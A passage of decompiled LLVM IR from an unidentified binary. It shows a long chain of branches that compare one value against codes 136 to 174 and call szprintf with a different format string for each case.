  %v3_c5d0 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_c5dc = sext i8 %v3_c5c4 to i32
  %v6_c5dc = sext i8 %v3_c5d0 to i32
  %v8_c5dc = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1cbb8.332 to i32), i32 %v4_c5dc, i32 %v6_c5dc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c5e0

dec_label_pc_c5e0:                                ; preds = %dec_label_pc_c5ac, %dec_label_pc_c5b8
  %v7_c5e4 = icmp eq i32 %v2_a7e4, 136
  br i1 %v7_c5e4, label %dec_label_pc_c5ec, label %dec_label_pc_c614

dec_label_pc_c5ec:                                ; preds = %dec_label_pc_c5e0
  %v3_c5f8 = load i8, i8* @global_var_28c59.70, align 1
  %v3_c604 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_c610 = sext i8 %v3_c5f8 to i32
  %v6_c610 = sext i8 %v3_c604 to i32
  %v8_c610 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1cbc8.334 to i32), i32 %v4_c610, i32 %v6_c610, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c614

dec_label_pc_c614:                                ; preds = %dec_label_pc_c5e0, %dec_label_pc_c5ec
  %v7_c618 = icmp eq i32 %v2_a7e4, 137
  br i1 %v7_c618, label %dec_label_pc_c620, label %dec_label_pc_c648

dec_label_pc_c620:                                ; preds = %dec_label_pc_c614
  %v3_c62c = load i8, i8* @global_var_28c59.70, align 1
  %v3_c638 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_c644 = sext i8 %v3_c62c to i32
  %v6_c644 = sext i8 %v3_c638 to i32
  %v8_c644 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1cbd8.336 to i32), i32 %v4_c644, i32 %v6_c644, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c648

dec_label_pc_c648:                                ; preds = %dec_label_pc_c614, %dec_label_pc_c620
  %v7_c64c = icmp eq i32 %v2_a7e4, 138
  br i1 %v7_c64c, label %dec_label_pc_c654, label %dec_label_pc_c67c

dec_label_pc_c654:                                ; preds = %dec_label_pc_c648
  %v3_c660 = load i8, i8* @global_var_28c59.70, align 1
  %v3_c66c = load i8, i8* @global_var_28c5a.71, align 1
  %v4_c678 = sext i8 %v3_c660 to i32
  %v6_c678 = sext i8 %v3_c66c to i32
  %v8_c678 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1cbe8.338 to i32), i32 %v4_c678, i32 %v6_c678, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c67c

dec_label_pc_c67c:                                ; preds = %dec_label_pc_c648, %dec_label_pc_c654
  %v7_c680 = icmp eq i32 %v2_a7e4, 139
  br i1 %v7_c680, label %dec_label_pc_c688, label %dec_label_pc_c6b0

dec_label_pc_c688:                                ; preds = %dec_label_pc_c67c
  %v3_c694 = load i8, i8* @global_var_28c59.70, align 1
  %v3_c6a0 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_c6ac = sext i8 %v3_c694 to i32
  %v6_c6ac = sext i8 %v3_c6a0 to i32
  %v8_c6ac = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1cbf8.340 to i32), i32 %v4_c6ac, i32 %v6_c6ac, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c6b0

dec_label_pc_c6b0:                                ; preds = %dec_label_pc_c67c, %dec_label_pc_c688
  %v7_c6b4 = icmp eq i32 %v2_a7e4, 140
  br i1 %v7_c6b4, label %dec_label_pc_c6bc, label %dec_label_pc_c6e4

dec_label_pc_c6bc:                                ; preds = %dec_label_pc_c6b0
  %v3_c6c8 = load i8, i8* @global_var_28c59.70, align 1
  %v3_c6d4 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_c6e0 = sext i8 %v3_c6c8 to i32
  %v6_c6e0 = sext i8 %v3_c6d4 to i32
  %v8_c6e0 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1cc08.342 to i32), i32 %v4_c6e0, i32 %v6_c6e0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c6e4

dec_label_pc_c6e4:                                ; preds = %dec_label_pc_c6b0, %dec_label_pc_c6bc
  %v7_c6e8 = icmp eq i32 %v2_a7e4, 141
  br i1 %v7_c6e8, label %dec_label_pc_c6f0, label %dec_label_pc_c718

dec_label_pc_c6f0:                                ; preds = %dec_label_pc_c6e4
  %v3_c6fc = load i8, i8* @global_var_28c59.70, align 1
  %v3_c708 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_c714 = sext i8 %v3_c6fc to i32
  %v6_c714 = sext i8 %v3_c708 to i32
  %v8_c714 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1cc18.344 to i32), i32 %v4_c714, i32 %v6_c714, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c718

dec_label_pc_c718:                                ; preds = %dec_label_pc_c6e4, %dec_label_pc_c6f0
  %v7_c71c = icmp eq i32 %v2_a7e4, 142
  br i1 %v7_c71c, label %dec_label_pc_c724, label %dec_label_pc_c74c

dec_label_pc_c724:                                ; preds = %dec_label_pc_c718
  %v3_c730 = load i8, i8* @global_var_28c59.70, align 1
  %v3_c73c = load i8, i8* @global_var_28c5a.71, align 1
  %v4_c748 = sext i8 %v3_c730 to i32
  %v6_c748 = sext i8 %v3_c73c to i32
  %v8_c748 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1cc28.346 to i32), i32 %v4_c748, i32 %v6_c748, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c74c

dec_label_pc_c74c:                                ; preds = %dec_label_pc_c718, %dec_label_pc_c724
  %v7_c750 = icmp eq i32 %v2_a7e4, 143
  br i1 %v7_c750, label %dec_label_pc_c758, label %dec_label_pc_c780

dec_label_pc_c758:                                ; preds = %dec_label_pc_c74c
  %v3_c764 = load i8, i8* @global_var_28c59.70, align 1
  %v3_c770 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_c77c = sext i8 %v3_c764 to i32
  %v6_c77c = sext i8 %v3_c770 to i32
  %v8_c77c = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1cb18.312 to i32), i32 %v4_c77c, i32 %v6_c77c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c780

dec_label_pc_c780:                                ; preds = %dec_label_pc_c74c, %dec_label_pc_c758
  %v7_c784 = icmp eq i32 %v2_a7e4, 144
  br i1 %v7_c784, label %dec_label_pc_c78c, label %dec_label_pc_c7b4

dec_label_pc_c78c:                                ; preds = %dec_label_pc_c780
  %v3_c798 = load i8, i8* @global_var_28c59.70, align 1
  %v3_c7a4 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_c7b0 = sext i8 %v3_c798 to i32
  %v6_c7b0 = sext i8 %v3_c7a4 to i32
  %v8_c7b0 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1cc38.348 to i32), i32 %v4_c7b0, i32 %v6_c7b0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c7b4

dec_label_pc_c7b4:                                ; preds = %dec_label_pc_c780, %dec_label_pc_c78c
  %v7_c7b8 = icmp eq i32 %v2_a7e4, 145
  br i1 %v7_c7b8, label %dec_label_pc_c7c0, label %dec_label_pc_c7e8

dec_label_pc_c7c0:                                ; preds = %dec_label_pc_c7b4
  %v3_c7cc = load i8, i8* @global_var_28c59.70, align 1
  %v3_c7d8 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_c7e4 = sext i8 %v3_c7cc to i32
  %v6_c7e4 = sext i8 %v3_c7d8 to i32
  %v8_c7e4 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1cc48.350 to i32), i32 %v4_c7e4, i32 %v6_c7e4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c7e8

dec_label_pc_c7e8:                                ; preds = %dec_label_pc_c7b4, %dec_label_pc_c7c0
  %v7_c7ec = icmp eq i32 %v2_a7e4, 146
  br i1 %v7_c7ec, label %dec_label_pc_c7f4, label %dec_label_pc_c81c

dec_label_pc_c7f4:                                ; preds = %dec_label_pc_c7e8
  %v3_c800 = load i8, i8* @global_var_28c59.70, align 1
  %v3_c80c = load i8, i8* @global_var_28c5a.71, align 1
  %v4_c818 = sext i8 %v3_c800 to i32
  %v6_c818 = sext i8 %v3_c80c to i32
  %v8_c818 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1cc58.352 to i32), i32 %v4_c818, i32 %v6_c818, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c81c

dec_label_pc_c81c:                                ; preds = %dec_label_pc_c7e8, %dec_label_pc_c7f4
  %v7_c820 = icmp eq i32 %v2_a7e4, 147
  br i1 %v7_c820, label %dec_label_pc_c828, label %dec_label_pc_c850

dec_label_pc_c828:                                ; preds = %dec_label_pc_c81c
  %v3_c834 = load i8, i8* @global_var_28c59.70, align 1
  %v3_c840 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_c84c = sext i8 %v3_c834 to i32
  %v6_c84c = sext i8 %v3_c840 to i32
  %v8_c84c = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1cc68.354 to i32), i32 %v4_c84c, i32 %v6_c84c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c850

dec_label_pc_c850:                                ; preds = %dec_label_pc_c81c, %dec_label_pc_c828
  %v7_c854 = icmp eq i32 %v2_a7e4, 148
  br i1 %v7_c854, label %dec_label_pc_c85c, label %dec_label_pc_c884

dec_label_pc_c85c:                                ; preds = %dec_label_pc_c850
  %v3_c868 = load i8, i8* @global_var_28c59.70, align 1
  %v3_c874 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_c880 = sext i8 %v3_c868 to i32
  %v6_c880 = sext i8 %v3_c874 to i32
  %v8_c880 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1cc78.356 to i32), i32 %v4_c880, i32 %v6_c880, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c884

dec_label_pc_c884:                                ; preds = %dec_label_pc_c850, %dec_label_pc_c85c
  %v7_c888 = icmp eq i32 %v2_a7e4, 149
  br i1 %v7_c888, label %dec_label_pc_c890, label %dec_label_pc_c8b8

dec_label_pc_c890:                                ; preds = %dec_label_pc_c884
  %v3_c89c = load i8, i8* @global_var_28c59.70, align 1
  %v3_c8a8 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_c8b4 = sext i8 %v3_c89c to i32
  %v6_c8b4 = sext i8 %v3_c8a8 to i32
  %v8_c8b4 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1cc88.358 to i32), i32 %v4_c8b4, i32 %v6_c8b4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c8b8

dec_label_pc_c8b8:                                ; preds = %dec_label_pc_c884, %dec_label_pc_c890
  %v7_c8bc = icmp eq i32 %v2_a7e4, 150
  br i1 %v7_c8bc, label %dec_label_pc_c8c4, label %dec_label_pc_c8ec

dec_label_pc_c8c4:                                ; preds = %dec_label_pc_c8b8
  %v3_c8d0 = load i8, i8* @global_var_28c59.70, align 1
  %v3_c8dc = load i8, i8* @global_var_28c5a.71, align 1
  %v4_c8e8 = sext i8 %v3_c8d0 to i32
  %v6_c8e8 = sext i8 %v3_c8dc to i32
  %v8_c8e8 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1cc98.360 to i32), i32 %v4_c8e8, i32 %v6_c8e8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c8ec

dec_label_pc_c8ec:                                ; preds = %dec_label_pc_c8b8, %dec_label_pc_c8c4
  %v7_c8f0 = icmp eq i32 %v2_a7e4, 151
  br i1 %v7_c8f0, label %dec_label_pc_c8f8, label %dec_label_pc_c920

dec_label_pc_c8f8:                                ; preds = %dec_label_pc_c8ec
  %v3_c904 = load i8, i8* @global_var_28c59.70, align 1
  %v3_c910 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_c91c = sext i8 %v3_c904 to i32
  %v6_c91c = sext i8 %v3_c910 to i32
  %v8_c91c = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1cca8.362 to i32), i32 %v4_c91c, i32 %v6_c91c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c920

dec_label_pc_c920:                                ; preds = %dec_label_pc_c8ec, %dec_label_pc_c8f8
  %v7_c924 = icmp eq i32 %v2_a7e4, 152
  br i1 %v7_c924, label %dec_label_pc_c92c, label %dec_label_pc_c954

dec_label_pc_c92c:                                ; preds = %dec_label_pc_c920
  %v3_c938 = load i8, i8* @global_var_28c59.70, align 1
  %v3_c944 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_c950 = sext i8 %v3_c938 to i32
  %v6_c950 = sext i8 %v3_c944 to i32
  %v8_c950 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1ca8c.294 to i32), i32 %v4_c950, i32 %v6_c950, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c954

dec_label_pc_c954:                                ; preds = %dec_label_pc_c920, %dec_label_pc_c92c
  %v7_c958 = icmp eq i32 %v2_a7e4, 153
  br i1 %v7_c958, label %dec_label_pc_c960, label %dec_label_pc_c988

dec_label_pc_c960:                                ; preds = %dec_label_pc_c954
  %v3_c96c = load i8, i8* @global_var_28c59.70, align 1
  %v3_c978 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_c984 = sext i8 %v3_c96c to i32
  %v6_c984 = sext i8 %v3_c978 to i32
  %v8_c984 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1ccb8.365 to i32), i32 %v4_c984, i32 %v6_c984, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c988

dec_label_pc_c988:                                ; preds = %dec_label_pc_c954, %dec_label_pc_c960
  %v7_c98c = icmp eq i32 %v2_a7e4, 154
  br i1 %v7_c98c, label %dec_label_pc_c994, label %dec_label_pc_c9bc

dec_label_pc_c994:                                ; preds = %dec_label_pc_c988
  %v3_c9a0 = load i8, i8* @global_var_28c59.70, align 1
  %v3_c9ac = load i8, i8* @global_var_28c5a.71, align 1
  %v4_c9b8 = sext i8 %v3_c9a0 to i32
  %v6_c9b8 = sext i8 %v3_c9ac to i32
  %v8_c9b8 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1ccc8.367 to i32), i32 %v4_c9b8, i32 %v6_c9b8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c9bc

dec_label_pc_c9bc:                                ; preds = %dec_label_pc_c988, %dec_label_pc_c994
  %v7_c9c0 = icmp eq i32 %v2_a7e4, 155
  br i1 %v7_c9c0, label %dec_label_pc_c9c8, label %dec_label_pc_c9f0

dec_label_pc_c9c8:                                ; preds = %dec_label_pc_c9bc
  %v3_c9d4 = load i8, i8* @global_var_28c59.70, align 1
  %v3_c9e0 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_c9ec = sext i8 %v3_c9d4 to i32
  %v6_c9ec = sext i8 %v3_c9e0 to i32
  %v8_c9ec = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1ccd8.369 to i32), i32 %v4_c9ec, i32 %v6_c9ec, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c9f0

dec_label_pc_c9f0:                                ; preds = %dec_label_pc_c9bc, %dec_label_pc_c9c8
  %v7_c9f4 = icmp eq i32 %v2_a7e4, 156
  br i1 %v7_c9f4, label %dec_label_pc_c9fc, label %dec_label_pc_ca24

dec_label_pc_c9fc:                                ; preds = %dec_label_pc_c9f0
  %v3_ca08 = load i8, i8* @global_var_28c59.70, align 1
  %v3_ca14 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_ca20 = sext i8 %v3_ca08 to i32
  %v6_ca20 = sext i8 %v3_ca14 to i32
  %v8_ca20 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1cce8.371 to i32), i32 %v4_ca20, i32 %v6_ca20, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ca24

dec_label_pc_ca24:                                ; preds = %dec_label_pc_c9f0, %dec_label_pc_c9fc
  %v7_ca28 = icmp eq i32 %v2_a7e4, 157
  br i1 %v7_ca28, label %dec_label_pc_ca30, label %dec_label_pc_ca58

dec_label_pc_ca30:                                ; preds = %dec_label_pc_ca24
  %v3_ca3c = load i8, i8* @global_var_28c59.70, align 1
  %v3_ca48 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_ca54 = sext i8 %v3_ca3c to i32
  %v6_ca54 = sext i8 %v3_ca48 to i32
  %v8_ca54 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1ccf8.373 to i32), i32 %v4_ca54, i32 %v6_ca54, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ca58

dec_label_pc_ca58:                                ; preds = %dec_label_pc_ca24, %dec_label_pc_ca30
  %v7_ca5c = icmp eq i32 %v2_a7e4, 158
  br i1 %v7_ca5c, label %dec_label_pc_ca64, label %dec_label_pc_ca8c

dec_label_pc_ca64:                                ; preds = %dec_label_pc_ca58
  %v3_ca70 = load i8, i8* @global_var_28c59.70, align 1
  %v3_ca7c = load i8, i8* @global_var_28c5a.71, align 1
  %v4_ca88 = sext i8 %v3_ca70 to i32
  %v6_ca88 = sext i8 %v3_ca7c to i32
  %v8_ca88 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([12 x i8]* @global_var_1cd08.375 to i32), i32 %v4_ca88, i32 %v6_ca88, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ca8c

dec_label_pc_ca8c:                                ; preds = %dec_label_pc_ca58, %dec_label_pc_ca64
  %v7_ca90 = icmp eq i32 %v2_a7e4, 159
  br i1 %v7_ca90, label %dec_label_pc_ca98, label %dec_label_pc_cac0

dec_label_pc_ca98:                                ; preds = %dec_label_pc_ca8c
  %v3_caa4 = load i8, i8* @global_var_28c59.70, align 1
  %v3_cab0 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_cabc = sext i8 %v3_caa4 to i32
  %v6_cabc = sext i8 %v3_cab0 to i32
  %v8_cabc = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1cd14.377 to i32), i32 %v4_cabc, i32 %v6_cabc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cac0

dec_label_pc_cac0:                                ; preds = %dec_label_pc_ca8c, %dec_label_pc_ca98
  %v7_cac4 = icmp eq i32 %v2_a7e4, 160
  br i1 %v7_cac4, label %dec_label_pc_cacc, label %dec_label_pc_caf4

dec_label_pc_cacc:                                ; preds = %dec_label_pc_cac0
  %v3_cad8 = load i8, i8* @global_var_28c59.70, align 1
  %v3_cae4 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_caf0 = sext i8 %v3_cad8 to i32
  %v6_caf0 = sext i8 %v3_cae4 to i32
  %v8_caf0 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1cd24.379 to i32), i32 %v4_caf0, i32 %v6_caf0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_caf4

dec_label_pc_caf4:                                ; preds = %dec_label_pc_cac0, %dec_label_pc_cacc
  %v7_caf8 = icmp eq i32 %v2_a7e4, 161
  br i1 %v7_caf8, label %dec_label_pc_cb00, label %dec_label_pc_cb28

dec_label_pc_cb00:                                ; preds = %dec_label_pc_caf4
  %v3_cb0c = load i8, i8* @global_var_28c59.70, align 1
  %v3_cb18 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_cb24 = sext i8 %v3_cb0c to i32
  %v6_cb24 = sext i8 %v3_cb18 to i32
  %v8_cb24 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1cd34.381 to i32), i32 %v4_cb24, i32 %v6_cb24, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cb28

dec_label_pc_cb28:                                ; preds = %dec_label_pc_caf4, %dec_label_pc_cb00
  %v7_cb2c = icmp eq i32 %v2_a7e4, 162
  br i1 %v7_cb2c, label %dec_label_pc_cb34, label %dec_label_pc_cb5c

dec_label_pc_cb34:                                ; preds = %dec_label_pc_cb28
  %v3_cb40 = load i8, i8* @global_var_28c59.70, align 1
  %v3_cb4c = load i8, i8* @global_var_28c5a.71, align 1
  %v4_cb58 = sext i8 %v3_cb40 to i32
  %v6_cb58 = sext i8 %v3_cb4c to i32
  %v8_cb58 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1cd44.383 to i32), i32 %v4_cb58, i32 %v6_cb58, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cb5c

dec_label_pc_cb5c:                                ; preds = %dec_label_pc_cb28, %dec_label_pc_cb34
  %v7_cb60 = icmp eq i32 %v2_a7e4, 163
  br i1 %v7_cb60, label %dec_label_pc_cb68, label %dec_label_pc_cb90

dec_label_pc_cb68:                                ; preds = %dec_label_pc_cb5c
  %v3_cb74 = load i8, i8* @global_var_28c59.70, align 1
  %v3_cb80 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_cb8c = sext i8 %v3_cb74 to i32
  %v6_cb8c = sext i8 %v3_cb80 to i32
  %v8_cb8c = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1cd54.385 to i32), i32 %v4_cb8c, i32 %v6_cb8c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cb90

dec_label_pc_cb90:                                ; preds = %dec_label_pc_cb5c, %dec_label_pc_cb68
  %v7_cb94 = icmp eq i32 %v2_a7e4, 164
  br i1 %v7_cb94, label %dec_label_pc_cb9c, label %dec_label_pc_cbc4

dec_label_pc_cb9c:                                ; preds = %dec_label_pc_cb90
  %v3_cba8 = load i8, i8* @global_var_28c59.70, align 1
  %v3_cbb4 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_cbc0 = sext i8 %v3_cba8 to i32
  %v6_cbc0 = sext i8 %v3_cbb4 to i32
  %v8_cbc0 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1cca8.362 to i32), i32 %v4_cbc0, i32 %v6_cbc0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cbc4

dec_label_pc_cbc4:                                ; preds = %dec_label_pc_cb90, %dec_label_pc_cb9c
  %v7_cbc8 = icmp eq i32 %v2_a7e4, 165
  br i1 %v7_cbc8, label %dec_label_pc_cbd0, label %dec_label_pc_cbf8

dec_label_pc_cbd0:                                ; preds = %dec_label_pc_cbc4
  %v3_cbdc = load i8, i8* @global_var_28c59.70, align 1
  %v3_cbe8 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_cbf4 = sext i8 %v3_cbdc to i32
  %v6_cbf4 = sext i8 %v3_cbe8 to i32
  %v8_cbf4 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1cd64.388 to i32), i32 %v4_cbf4, i32 %v6_cbf4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cbf8

dec_label_pc_cbf8:                                ; preds = %dec_label_pc_cbc4, %dec_label_pc_cbd0
  %v7_cbfc = icmp eq i32 %v2_a7e4, 166
  br i1 %v7_cbfc, label %dec_label_pc_cc04, label %dec_label_pc_cc2c

dec_label_pc_cc04:                                ; preds = %dec_label_pc_cbf8
  %v3_cc10 = load i8, i8* @global_var_28c59.70, align 1
  %v3_cc1c = load i8, i8* @global_var_28c5a.71, align 1
  %v4_cc28 = sext i8 %v3_cc10 to i32
  %v6_cc28 = sext i8 %v3_cc1c to i32
  %v8_cc28 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1cd74.390 to i32), i32 %v4_cc28, i32 %v6_cc28, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cc2c

dec_label_pc_cc2c:                                ; preds = %dec_label_pc_cbf8, %dec_label_pc_cc04
  %v7_cc30 = icmp eq i32 %v2_a7e4, 167
  br i1 %v7_cc30, label %dec_label_pc_cc38, label %dec_label_pc_cc60

dec_label_pc_cc38:                                ; preds = %dec_label_pc_cc2c
  %v3_cc44 = load i8, i8* @global_var_28c59.70, align 1
  %v3_cc50 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_cc5c = sext i8 %v3_cc44 to i32
  %v6_cc5c = sext i8 %v3_cc50 to i32
  %v8_cc5c = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1cd14.377 to i32), i32 %v4_cc5c, i32 %v6_cc5c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cc60

dec_label_pc_cc60:                                ; preds = %dec_label_pc_cc2c, %dec_label_pc_cc38
  %v7_cc64 = icmp eq i32 %v2_a7e4, 168
  br i1 %v7_cc64, label %dec_label_pc_cc6c, label %dec_label_pc_cc94

dec_label_pc_cc6c:                                ; preds = %dec_label_pc_cc60
  %v3_cc78 = load i8, i8* @global_var_28c59.70, align 1
  %v3_cc84 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_cc90 = sext i8 %v3_cc78 to i32
  %v6_cc90 = sext i8 %v3_cc84 to i32
  %v8_cc90 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1cd84.392 to i32), i32 %v4_cc90, i32 %v6_cc90, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cc94

dec_label_pc_cc94:                                ; preds = %dec_label_pc_cc60, %dec_label_pc_cc6c
  %v7_cc98 = icmp eq i32 %v2_a7e4, 169
  br i1 %v7_cc98, label %dec_label_pc_cca0, label %dec_label_pc_ccc8

dec_label_pc_cca0:                                ; preds = %dec_label_pc_cc94
  %v3_ccac = load i8, i8* @global_var_28c59.70, align 1
  %v3_ccb8 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_ccc4 = sext i8 %v3_ccac to i32
  %v6_ccc4 = sext i8 %v3_ccb8 to i32
  %v8_ccc4 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1cd94.394 to i32), i32 %v4_ccc4, i32 %v6_ccc4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ccc8

dec_label_pc_ccc8:                                ; preds = %dec_label_pc_cc94, %dec_label_pc_cca0
  %v7_cccc = icmp eq i32 %v2_a7e4, 171
  br i1 %v7_cccc, label %dec_label_pc_ccd4, label %dec_label_pc_ccfc

dec_label_pc_ccd4:                                ; preds = %dec_label_pc_ccc8
  %v3_cce0 = load i8, i8* @global_var_28c59.70, align 1
  %v3_ccec = load i8, i8* @global_var_28c5a.71, align 1
  %v4_ccf8 = sext i8 %v3_cce0 to i32
  %v6_ccf8 = sext i8 %v3_ccec to i32
  %v8_ccf8 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1cda4.396 to i32), i32 %v4_ccf8, i32 %v6_ccf8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ccfc

dec_label_pc_ccfc:                                ; preds = %dec_label_pc_ccc8, %dec_label_pc_ccd4
  %v7_cd00 = icmp eq i32 %v2_a7e4, 172
  br i1 %v7_cd00, label %dec_label_pc_cd08, label %dec_label_pc_cd30

dec_label_pc_cd08:                                ; preds = %dec_label_pc_ccfc
  %v3_cd14 = load i8, i8* @global_var_28c59.70, align 1
  %v3_cd20 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_cd2c = sext i8 %v3_cd14 to i32
  %v6_cd2c = sext i8 %v3_cd20 to i32
  %v8_cd2c = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1cdb4.398 to i32), i32 %v4_cd2c, i32 %v6_cd2c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cd30

dec_label_pc_cd30:                                ; preds = %dec_label_pc_ccfc, %dec_label_pc_cd08
  %v7_cd34 = icmp eq i32 %v2_a7e4, 173
  br i1 %v7_cd34, label %dec_label_pc_cd3c, label %dec_label_pc_cd64

dec_label_pc_cd3c:                                ; preds = %dec_label_pc_cd30
  %v3_cd48 = load i8, i8* @global_var_28c59.70, align 1
  %v3_cd54 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_cd60 = sext i8 %v3_cd48 to i32
  %v6_cd60 = sext i8 %v3_cd54 to i32
  %v8_cd60 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1cdc4.400 to i32), i32 %v4_cd60, i32 %v6_cd60, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cd64

dec_label_pc_cd64:                                ; preds = %dec_label_pc_cd30, %dec_label_pc_cd3c
  %v7_cd68 = icmp eq i32 %v2_a7e4, 174
  br i1 %v7_cd68, label %dec_label_pc_cd70, label %dec_label_pc_cd98

dec_label_pc_cd70:                                ; preds = %dec_label_pc_cd64
  %v3_cd7c = load i8, i8* @global_var_28c59.70, align 1
  %v3_cd88 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_cd94 = sext i8 %v3_cd7c to i32
  %v6_cd94 = sext i8 %v3_cd88 to i32
